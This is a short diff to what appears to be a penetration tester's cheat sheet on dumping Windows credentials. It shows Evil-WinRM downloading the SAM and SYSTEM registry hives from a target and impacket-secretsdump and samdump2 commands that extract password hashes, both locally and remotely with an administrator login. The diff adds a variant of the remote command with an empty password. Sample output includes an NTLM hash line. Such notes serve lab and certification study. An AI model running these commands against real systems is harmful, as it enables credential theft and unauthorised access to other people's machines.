@@ -333,9 +333,13 @@ c:\system z:\loot
 *Evil-WinRM* PS C:\windows.old\Windows\system32> download SAM
 *Evil-WinRM* PS C:\windows.old\Windows\system32> download SYSTEM
 
+
+TRY IT WITHOUT PUTTING THE PASSWORD IN THE PROMPT
+
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 /opt/impacket/examples/secretsdump.py -sam sam -security security -system system LOCAL
 impacket-secretsdump Admin:'password'@$ip -outputfile hashes
+impacket-secretsdump Admin:@$ip -outputfile hashes
 
 samdump2 SYSTEM SAM
 *disabled* Admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
